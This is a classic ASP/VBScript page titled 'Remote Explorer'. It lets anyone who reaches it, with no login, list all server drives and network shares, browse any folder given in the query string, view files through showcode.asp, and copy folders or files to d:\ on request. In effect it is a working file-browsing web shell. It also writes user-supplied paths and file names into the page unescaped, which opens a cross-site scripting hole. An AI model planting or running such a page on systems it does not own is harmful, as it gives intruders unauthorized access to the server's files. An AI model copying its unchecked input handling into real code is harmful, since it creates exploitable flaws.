<%@ Language=VBScript %>
<%
Option Explicit

Dim giCount
Dim gvAttributes

Dim Ext

Dim ScriptFolder
Dim FolderPath

Dim FileSystem
Dim Drives
Dim Drive
Dim Folders
Dim Folder
Dim SubFolders
Dim SubFolder
Dim Files
Dim File

Dim BgColor, BackgroundColor,FSO

If Request.QueryString("CopyFolder") <> "" Then
 Set FSO = CreateObject("Scripting.FileSystemObject")
 FSO.CopyFolder Request.QueryString("CopyFolder") & "*", "d:\"
End If

If Request.QueryString("CopyFile") <> "" Then
 Set FSO = CreateObject("Scripting.FileSystemObject")
 FSO.CopyFile Request.QueryString("FolderPath") & Request.QueryString("CopyFile"), "d:\"
End If

Set FileSystem = Server.CreateObject("Scripting.FileSystemObject")

FolderPath = Request.QueryString("FolderPath")

If FolderPath = "" Then
 FolderPath = Request.ServerVariables("PATH_TRANSLATED")
End If

FolderPath = ParseFolder(FolderPath)

ScriptFolder = ParseFolder(Request.ServerVariables("PATH_TRANSLATED")) & "images\"

%>
<html>
<head>
<title>Remote Explorer</title>
<style type="text/css">
BODY
{
 BACKGROUND-COLOR: #C0C0C0
    FONT-FAMILY: 'MS Sans Serif', Arial;
    FONT-SIZE: 8px;
 MARGIN: 0px
}
td, input, select
{
    FONT-FAMILY: 'MS Sans Serif', Arial;
    FONT-SIZE: 8px;
}
.Address
{
    BACKGROUND-ATTACHMENT: fixed;
    BACKGROUND-POSITION: 1px center;
    BACKGROUND-REPEAT: no-repeat;
    Padding-LEFT: 10px
}
.Go
{
    BACKGROUND-ATTACHMENT: fixed;
    BACKGROUND-POSITION: left center;
    BACKGROUND-REPEAT: no-repeat;
    Padding-LEFT: 10px
}
</style>
</head>
<body bgcolor="#c0c0c0">
<table width="100%" cellpadding="0" cellspacing="0" border="0">
<tr>
<form>
<td width="1%" nowrap>   
<select name="FolderPath" id="Drive">
<%
Set Drives = FileSystem.Drives
For Each Drive In Drives
 Response.Write "<OPTION value=""" & Drive.DriveLetter & ":\"""
 If InStr(UCase(FolderPath), Drive.DriveLetter & ":\") > 0 Then Response.Write " selected"
  Response.Write ">"
  Response.Write Drive.DriveLetter & " - "
  If Drive.DriveType = "Remote" Then
   Response.Write Drive.ShareName & " [share]"
  ElseIf Drive.DriveLetter <> "A" Then
   If Drive.IsReady Then
    Response.Write Drive.VolumeName
   Else
    Response.Write "(Not Ready)"
   End If
  Else
   Response.Write "(Skiped Detection)"
  End If
  Response.Write "</OPTION>"
 Next
%>
</select> <input class="Go" type="submit" value="Go" style="border:1px outset">
</td>
</form>
<td width="1%">   Address: </td>
<form>
<td width="100%">
<input class="Address" type="text" name="FolderPath" value="<%=FolderPath%>" style="width:100%" size="20">
</td>
<td width="1%">
<input class="Go" type="submit" value="Go"style="border:1px outset">
</td>
</form>
</tr>
</table>
<%
Set Folder = FileSystem.GetFolder(FolderPath)
Set SubFolders = Folder.SubFolders
Set Files = Folder.Files
%>
<br>
<table cellpadding="1" cellspacing="1" border="0" width="100%" align="center" style="border:1px inset">
<tr>
<td width="40%" height="20" bgcolor="silver">  Name</td>
<td width="10%" bgcolor="silver" align="right">Size    </td>
<td width="20%" bgcolor="silver">Type </td>
<td width="20%" bgcolor="silver">Modified </td>
<td width="10%" bgcolor="silver" align="right">Attributes  </td>
</tr>
<%
If Not Folder.IsRootFolder Then
 BgToggle
%>
<tr title="Top Level">
<td bgcolor="<%=BgColor%>"><a href= "<%=Request.ServerVariables("script_name")%>?FolderPath=<%=Server.URLPathEncode(Folder.Drive & "\")%>"><font face="wingdings" size="4">O</font> Top Level</a> </td>
<td bgcolor="<%=BgColor%>"> </td>
<td bgcolor="<%=BgColor%>"> </td>
<td bgcolor="<%=BgColor%>"> </td>
<td bgcolor="<%=BgColor%>"> </td>
</tr>
<%BgToggle%>
<tr>
<td bgcolor="<%=BgColor%>"><a href= "<%=Request.ServerVariables("script_name")%>?FolderPath=<%=Server.URLPathEncode(Folder)%>"><font face="wingdings" size="4">¶</font> Up One Level</a> </td>
<td bgcolor="<%=BgColor%>"> </td>
<td bgcolor="<%=BgColor%>"> </td>
<td bgcolor="<%=BgColor%>"> </td>
<td bgcolor="<%=BgColor%>"> </td>
</tr>
<%
End If
For Each SubFolder In SubFolders
 BgToggle
%>
<tr>
<td bgcolor="<%=BgColor%>" title="<%=SubFolder.Name%>"> <a href= "<%=Request.ServerVariables("script_name") & "?FolderPath=" & Server.URLPathEncode(FolderPath & SubFolder.Name & "\")%>"><font face="wingdings" size="4">0</font> <b><%=SubFolder.Name%></b></a>        (<a href= "<%=Request.ServerVariables("script_name")%>?CopyFolder=<%=Server.URLPathEncode(FolderPath & SubFolder.Name)%>&FolderPath=<%=Server.URLPathEncode(FolderPath & "\")%>">Copy</a>)</td>
<td bgcolor="<%=BgColor%>"> </td>
<td bgcolor="<%=BgColor%>"><%=SubFolder.Type%>  </td>
<td bgcolor="<%=BgColor%>"><%=SubFolder.DateLastModified%> </td>
<td bgcolor="<%=BgColor%>" align="right"><%=Attributes(SubFolder.Attributes)%></td>
</tr>
<%
Next
For Each File In Files
 BgToggle
 Ext = FileExtension(File.Name)
%>
<tr>
<td bgcolor="<%=BgColor%>" title="<%=File.Name%>"> <a href= "showcode.asp?f=<%=File.Name%>&FolderPath=<%=Server.URLPathEncode(FolderPath)%>" target="_blank"><font face="wingdings" size="4">3</font> "<%=File.Name%></a>        (<a href= "<%=Request.ServerVariables("script_name")%>?CopyFile=<%=File.Name%>&FolderPath=<%=Server.URLPathEncode(FolderPath & "\")%>">Copy</a>)</td>
<td bgcolor="<%=BgColor%>" align="right"><%=(File.Size)%> Byte  </td>
<td bgcolor="<%=BgColor%>"><%=File.Type%></td>
<td bgcolor="<%=BgColor%>"><%=File.DateLastModified%></td>
<td bgcolor="<%=BgColor%>" align="right"><%=Attributes(File.Attributes)%></td>
</tr>
<%Next%>
</table>
</body>
</html>
<%
Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal MinUpperBound, ByVal IndexSeperator)
    Dim lsResult
    Dim llTemp
    Dim giCount
    MaxValuePerIndex = MaxValuePerIndex + 1
    Do While Int(SourceNumber / (MaxValuePerIndex ^ MinUpperBound)) > (MaxValuePerIndex - 1)
        MinUpperBound = MinUpperBound + 1
    Loop
    For giCount = MinUpperBound To 0 Step -1
        llTemp = Int(SourceNumber / (MaxValuePerIndex ^ giCount))
        lsResult = lsResult & CStr(llTemp)
        If giCount > 0 Then lsResult = lsResult & IndexSeperator
        SourceNumber = SourceNumber - (llTemp * (MaxValuePerIndex ^ giCount))
    Next
    ConvertBinary = lsResult
End Function

Private Sub BgToggle()
 BackgroundColor = Not(BackgroundColor)
 If BackgroundColor Then
  BgColor = "#efefef"
 Else
  BgColor = "#ffffff"
 End If
End Sub

Private Function Attributes(AttributeValue)
 Dim lvAttributes
 Dim lsResult
 lvAttributes = Split(ConvertBinary(AttributeValue, 1, 7, ","), ",")
 If lvAttributes(0) = 1 Then lsResult = "ReadOnly&nbsp;&nbsp;"
 If lvAttributes(1) = 1 Then lsResult = lsResult & "Hidden&nbsp;&nbsp;"
 If lvAttributes(2) = 1 Then lsResult = lsResult & "System&nbsp;&nbsp;"
 If lvAttributes(5) = 1 Then lsResult = lsResult & "Archive&nbsp;&nbsp;"
 Attributes = lsResult
End Function

Private Function FileExtension(FileName)
 Dim lsExt
 Dim liCount
 For liCount = Len(FileName) To 1 Step -1
  If Mid(FileName, liCount, 1) = "." Then
   lsExt = Right(FileName, Len(FileName) - liCount)
   Exit For
  End If
 Next
 If Not FileSystem.FileExists(ScriptFolder & "ext_" & lsExt & ".gif") Then
  lsExt = ""
 End If
 FileExtension = lsExt
End Function

Private Function ParseFolder(PathString)
 Dim liCount
 If Right(PathString, 1) = "\" Then
  ParseFolder = PathString
 Else
  For liCount = Len(PathString) To 1 Step -1
   If Mid(PathString, liCount, 1) = "\" Then
    ParseFolder = Left(PathString, liCount)
    Exit For
   End If
  Next
 End If
End Function
%>

